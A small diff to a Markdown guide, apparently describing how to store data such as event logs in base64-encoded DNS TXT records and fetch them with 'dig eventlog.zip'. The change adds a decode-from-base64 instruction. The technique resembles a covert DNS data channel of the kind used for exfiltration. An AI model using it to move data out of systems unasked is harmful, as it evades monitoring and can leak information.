@@ -62,7 +62,7 @@ Write-Host = $out
 catch { }
 ```
 
-9. now simply make a dns request to retrieve the TXT data of the dnsrecord for eventlog.zip
+9. now simply make a dns request to retrieve the TXT data of the dnsrecord for eventlog.zip and decode it from base64.
 ```
 dig eventlog.zip
 ``` 
